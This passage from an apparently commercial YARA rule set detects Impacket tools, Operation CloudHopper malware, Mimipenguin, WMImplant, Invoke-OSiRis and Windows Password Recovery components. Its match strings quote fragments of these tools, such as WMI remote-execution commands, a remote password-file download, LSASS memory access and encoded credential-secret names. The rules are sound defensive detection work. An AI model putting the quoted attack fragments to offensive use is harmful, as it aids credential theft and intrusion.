      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:19:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "logging.config(" fullword ascii
      $s2 = "ssmbexec" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )
} 

rule Impacket_Tools_smbtorture_RID3165 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 13:20:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "impacket" fullword ascii
      $s2 = "ssmbtorture" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )
} 

rule Impacket_Tools_wmipersist_RID3165 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 13:20:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "swmipersist" fullword ascii
      $s2 = "\\yzHPlU=QA" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )
} 

rule Impacket_Tools_wmiquery_RID3091 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "swmiquery" fullword ascii
      $s2 = "\\yzHPlU=QA" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )
} 

rule Impacket_Tools_tracer_RID2F8F : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:02:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "btk85.dll" fullword ascii
      $s2 = "btcl85.dll" fullword ascii
      $s3 = "xtk\\unsupported.tcl" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 21000KB and all of them )
} 

rule Impacket_Tools_wmiexec_RID3000 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "bwmiexec.exe.manifest" fullword ascii
      $s2 = "swmiexec" fullword ascii
      $s3 = "\\yzHPlU=QA" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and 2 of them )
} 

rule Impacket_Tools_sniffer_RID2FFB : DEMO EXE FILE HKTL T1040 T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:20:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1040, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ssniffer" fullword ascii
      $s2 = "impacket.dhcp(" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )
} 

rule Impacket_Tools_goldenPac_RID309B : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "impacket.examples.serviceinstall(" fullword ascii
      $s2 = "bgoldenPac.exe" fullword ascii
      $s3 = "json.scanner(" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )
} 

rule Impacket_Tools_netview_RID3010 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:23:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "impacket.dcerpc.v5.wkst(" fullword ascii
      $s2 = "dummy_threading(" fullword ascii
      $s3 = "snetview" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )
} 

rule Impacket_Tools_mimikatz_RID3074 : DEMO EXE FILE HKTL S0002 T1003 T1075 T1097 T1136 T1178 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:40:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, S0002, T1003, T1075, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "impacket" fullword ascii
      $s2 = "smimikatz" fullword ascii
      $s3 = "otwsdlc" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )
} 

rule Impacket_Tools_smbrelayx_RID30E5 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "impacket.examples.secretsdump" fullword ascii
      $s2 = "impacket.examples.serviceinstall" fullword ascii
      $s3 = "impacket.smbserver(" fullword ascii
      $s4 = "SimpleHTTPServer(" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 18000KB and 3 of them )
} 

rule Impacket_Tools_lookupsid_RID30E8 : DEMO EXE FILE HKTL T1086 T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:59:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "slookupsid" fullword ascii
      $s2 = "impacket.dcerpc" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )
} 

rule Impacket_Tools_atexec_RID2F88 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:01:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "batexec.exe.manifest" fullword ascii
      $s2 = "satexec" fullword ascii
      $s3 = "impacket.dcerpc" fullword ascii
      $s4 = "# CSZq" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 3 of them )
} 

rule Impacket_Tools_psexec_RID2F96 : DEMO EXE FILE HKTL T1035 T1086 T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:03:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1035, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "impacket.examples.serviceinstall(" fullword ascii
      $s2 = "spsexec" fullword ascii
      $s3 = "impacket.examples.remcomsvc(" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and 2 of them )
} 

rule Impacket_Tools_Generic_1_RID305B : DEMO EXE FILE GEN HKTL T1136 {
   meta:
      description = "Compiled Impacket Tools"
      author = "Florian Roth"
      reference = "https://github.com/maaaaz/impacket-examples-windows"
      date = "2017-04-07 12:36:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "bpywintypes27.dll" fullword ascii
      $s2 = "hZFtPC" fullword ascii
      $s3 = "impacket" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 21000KB and all of ( $s* ) ) or ( all of them )
} 

rule OpCloudHopper_Malware_1_RID2FED : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "zok]\\\\\\ZZYYY666564444" fullword ascii
      $s2 = "z{[ZZYUKKKIIGGGGGGGGGGGGG" fullword ascii
      $s3 = "EEECEEC" fullword ascii
      $s4 = "IIEFEE" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule OpCloudHopper_Malware_2_RID2FEE : DEMO EXE FILE MAL T1085 T1136 {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "sERvEr.Dll" fullword ascii
      $x2 = "ToolbarF.dll" fullword wide
      $x3 = ".?AVCKeyLoggerManager@@" fullword ascii
      $x4 = "GH0STCZH" ascii
      $s1 = "%%SystemRoot%%\\System32\\svchost.exe -k \"%s\"" fullword wide
      $s2 = "rundll32.exe \"%s\", UnInstall /update %s" fullword wide
      $s3 = "\\Release\\Loader.pdb" fullword ascii
      $s4 = "%s\\%x.dll" fullword wide
      $s5 = "Mozilla/4.0 (compatible)" fullword wide
      $s6 = "\\syslog.dat" fullword wide
      $s7 = "NSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" fullword wide
      $op1 = { 8d 34 17 8d 49 00 8a 14 0e 3a 14 29 75 05 41 3b } 
      $op2 = { 83 e8 14 78 cf c1 e0 06 8b f8 8b c3 8a 08 84 c9 } 
      $op3 = { 3b fb 7d 3f 8a 4d 14 8d 45 14 84 c9 74 1b 8a 14 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) or all of ( $op* ) ) or ( 6 of them )
} 

rule OpCloudHopper_Malware_3_RID2FEF : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:18:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "operator \"\" " fullword ascii
      $s7 = "zok]\\\\\\ZZYYY666564444" fullword ascii
      $s11 = "InvokeMainViaCRT" fullword ascii
      $s12 = ".?AVAES@@" fullword ascii
      $op1 = { b6 4c 06 f5 32 cf 88 4c 06 05 0f b6 4c 06 f9 32 } 
      $op2 = { 06 fc eb 03 8a 5e f0 85 c0 74 05 8a 0c 06 eb 03 } 
      $op3 = { 7e f8 85 c0 74 06 8a 74 06 08 eb 03 8a 76 fc 85 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( all of ( $s* ) and 1 of ( $op* ) ) or all of ( $op* ) ) or ( 5 of them )
} 

rule OpCloudHopper_Dropper_1_RID3000 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "{\\version2}{\\edmins0}{\\nofpages1}{\\nofwords11}{\\nofchars69}{\\*\\company google}{\\nofcharsws79}{\\vern24611}{\\*\\password" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5c7b and filesize < 700KB and all of them )
} 

rule OpCloudHopper_Malware_4_RID2FF0 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:18:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "operator \"\" " fullword ascii
      $s9 = "InvokeMainViaCRT" fullword ascii
      $s10 = ".?AVAES@@" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them )
} 

rule OpCloudHopper_Malware_5_RID2FF1 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:18:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "CWINDOWSSYSTEMROOT" fullword ascii
      $x2 = "YJ_D_KROPOX_M_NUJI_OLY_S_JU_MOOK" fullword ascii
      $x3 = "NJK_JK_SED_PNJHGFUUGIOO_PIY" fullword ascii
      $x4 = "c_VDGQBUl}YSB_C_VDlqSDYFU" fullword ascii
      $s7 = "FALLINLOVE" fullword ascii
      $op1 = { 83 ec 60 8d 4c 24 00 e8 6f ff ff ff 8d 4c 24 00 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 2 of them ) ) or ( 4 of them )
} 

rule OpCloudHopper_Malware_6_RID2FF2 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:18:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "YDNCCOVZKXGRVQPOBRNXXQVNQYXBBCONCOQEGYELIRBEYOVODGXCOXTHXPCXNGUCHRVWKKZSYQMAOWWGHRSPRGSEUWYMEFZHRTHO" fullword ascii
      $s2 = "psychiatry.dat" fullword ascii
      $s3 = "meekness.lnk" fullword ascii
      $s4 = "SOFTWARE\\EGGORG" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )
} 

rule OpCloudHopper_Malware_7_RID2FF3 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:19:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "jepsjepsjepsjepsjepsjepsjepsjepsjepsjeps" fullword ascii
      $x2 = "extOextOextOextO" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
} 

rule OpCloudHopper_Malware_8_RID2FF4 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:19:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "WSHELL32.dll" fullword wide
      $s2 = "operator \"\" " fullword ascii
      $s3 = "\" /t REG_SZ /d \"" fullword wide
      $s4 = " /f /v \"" fullword wide
      $s5 = "zok]\\\\\\ZZYYY666564444" fullword ascii
      $s6 = "AFX_DIALOG_LAYOUT" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 4 of them )
} 

rule OpCloudHopper_Malware_9_RID2FF5 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:19:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "MsMpEng.exe" fullword ascii
      $op0 = { 2b c7 50 e8 22 83 ff ff ff b6 c0 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule OpCloudHopper_Malware_10_RID301D : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:26:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "bakshell.EXE" fullword wide
      $s19 = "bakshell Applicazione MFC" fullword wide
      $op0 = { 83 c4 34 c3 57 8b ce e8 92 18 00 00 68 20 70 40 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )
} 

rule OpCloudHopper_Malware_11_RID301E : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:26:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "IOGVWDWCXZVRHTE" fullword ascii
      $op1 = { c9 c3 56 6a 00 8b f1 6a 64 e8 dd 34 00 00 c7 06 } 
      $op2 = { 68 38 00 41 00 68 34 00 41 00 e8 d3 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )
} 

rule Mimipenguin_SH_RID2C8D : DEMO HKTL T1003 T1136 {
   meta:
      description = "Detects Mimipenguin Password Extractor - Linux"
      author = "Florian Roth"
      reference = "https://github.com/huntergregal/mimipenguin"
      date = "2017-04-01 09:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$(echo $thishash | cut -d'$' -f 3)" ascii
      $s2 = "ps -eo pid,command | sed -rn '/gnome\\-keyring\\-daemon/p' | awk" ascii
      $s3 = "MimiPenguin Results:" ascii
   condition: 
      1 of them
} 

rule Invoke_OSiRis_RID2C15 : DEMO SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Osiris Device Guard Bypass - file Invoke-OSiRis.ps1"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-27 09:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "$null = Iwmi Win32_Process -EnableA -Impers 3 -AuthenPacketprivacy -Name Create -Arg $ObfusK -Computer $Target" fullword ascii
      $x2 = "Invoke-OSiRis" ascii
      $x3 = "-Arg@{Name=$VarName;VariableValue=$OSiRis;UserName=$env:Username}" fullword ascii
      $x4 = "Device Guard Bypass Command Execution" fullword ascii
      $x5 = "-Put Payload in Win32_OSRecoveryConfiguration DebugFilePath" fullword ascii
      $x6 = "$null = Iwmi Win32_Process -EnableA -Impers 3 -AuthenPacketprivacy -Name Create" fullword ascii
   condition: 
      1 of them
} 

rule Malware_JS_powershell_obfuscated_RID33F9 : DEMO MAL OBFUS T1027 T1086 T1136 {
   meta:
      description = "Unspecified malware - file rechnung_3.js"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-24 15:10:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, OBFUS, T1027, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "po\" + \"wer\" + \"sh\" + \"e\" + \"ll\";" fullword ascii
   condition: 
      filesize < 30KB and 1 of them
} 

rule WMImplant_RID2A8A : DEMO SCRIPT T1047 T1064 T1086 T1136 {
   meta:
      description = "Detects WMI implant- file WMImplant_RID2A8A.ps1"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html"
      date = "2017-03-24 06:41:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1047, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Invoke-ProcessPunisher -Creds $RemoteCredential" fullword ascii
      $x2 = "$Target -query \"SELECT * FROM Win32_NTLogEvent WHERE (logfile='security')" ascii
      $x3 = "WMImplant_RID2A8A -Creds" fullword ascii
      $x4 = "-Download -RemoteFile C:\\passwords.txt" ascii
      $x5 = "-Command 'powershell.exe -command \"Enable-PSRemoting" fullword ascii
      $x6 = "Invoke-WMImplant_RID2A8A" fullword ascii
   condition: 
      1 of them
} 

rule BeyondExec_RemoteAccess_Tool_RID3211 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects BeyondExec Remote Access Tool - file rexesvr.exe"
      author = "Florian Roth"
      reference = "https://goo.gl/BvYurS"
      date = "2017-03-17 13:49:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\BeyondExecV2\\Server\\Release\\Pipes.pdb" ascii
      $x2 = "\\\\.\\pipe\\beyondexec%d-stdin" fullword ascii
      $x3 = "Failed to create dispatch pipe. Do you have another instance running?" fullword ascii
      $op1 = { 83 e9 04 72 0c 83 e0 03 03 c8 ff 24 85 80 6f 40 } 
      $op2 = { 6a 40 33 c0 59 bf e0 d8 40 00 f3 ab 8d 0c 52 c1 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or all of ( $op* ) ) ) or ( 3 of them )
} 

rule WPR_loader_EXE_RID2C21 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Windows Password Recovery - file loader.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15 09:36:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Failed to get system process ID" fullword wide
      $s2 = "gLSASS.EXE" fullword wide
      $s3 = "WriteProcessMemory failed" fullword wide
      $s4 = "wow64 process NOT created" fullword wide
      $s5 = "\\ast.exe" fullword wide
      $s6 = "Exit code=%s, status=%d" fullword wide
      $s7 = "VirtualProtect failed" fullword wide
      $s8 = "nSeDebugPrivilege" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them )
} 

rule WPR_loader_DLL_RID2C1B : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Windows Password Recovery - file loader64.dll"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15 09:35:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "loader64.dll" fullword ascii
      $x2 = "loader.dll" fullword ascii
      $s1 = "TUlDUk9TT0ZUX0FVVEhFTlRJQ0FUSU9OX1BBQ0tBR0VfVjFfMA==" fullword ascii
      $s2 = "UmVtb3RlRGVza3RvcEhlbHBBc3Npc3RhbnRBY2NvdW50" fullword ascii
      $s3 = "U2FtSVJldHJpZXZlUHJpbWFyeUNyZWRlbnRpYWxz" fullword ascii
      $s4 = "VFM6SW50ZXJuZXRDb25uZWN0b3JQc3dk" fullword ascii
      $s5 = "TCRVRUFjdG9yQWx0Q3JlZFByaXZhdGVLZXk=" fullword ascii
      $s6 = "YXNwbmV0X1dQX1BBU1NXT1JE" fullword ascii
      $s7 = "TCRBTk1fQ1JFREVOVElBTFM=" fullword ascii
      $s8 = "RGVmYXVsdFBhc3N3b3Jk" fullword ascii
      $op0 = { 48 8b cd e8 e0 e8 ff ff 48 89 07 48 85 c0 74 72 } 
      $op1 = { e8 ba 23 00 00 33 c9 ff 15 3e 82 } 
      $op2 = { 48 83 c4 28 e9 bc 55 ff ff 48 8d 0d 4d a7 00 00 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( ( 1 of ( $x* ) and 1 of ( $s* ) ) or ( 1 of ( $s* ) and all of ( $op* ) ) )
} 

rule WPR_Passscape_Loader_RID2EC2 : DEMO EXE FILE HKTL T1050 T1136 {
   meta:
      description = "Windows Password Recovery - file ast.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15 11:28:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SYSTEM\\CurrentControlSet\\Services\\PasscapeLoader64" fullword wide
      $s2 = "ast64.dll" fullword ascii
      $s3 = "\\loader64.exe" fullword wide
      $s4 = "Passcape 64-bit Loader Service" fullword wide
      $s5 = "PasscapeLoader64" fullword wide
      $s6 = "ast64 {msg1GkjN7Sh8sg2Al7ker63f}" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )
} 

rule WPR_Asterisk_Hook_Library_RID30D3 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Windows Password Recovery - file ast64.dll"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15 12:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ast64.dll" fullword ascii
      $s2 = "ast.dll" fullword wide
      $s3 = "c:\\%s.lvc" fullword ascii
      $s4 = "c:\\%d.lvc" fullword ascii
      $s5 = "Asterisk Hook Library" fullword wide
      $s6 = "?Ast_StartRd64@@YAXXZ" fullword ascii
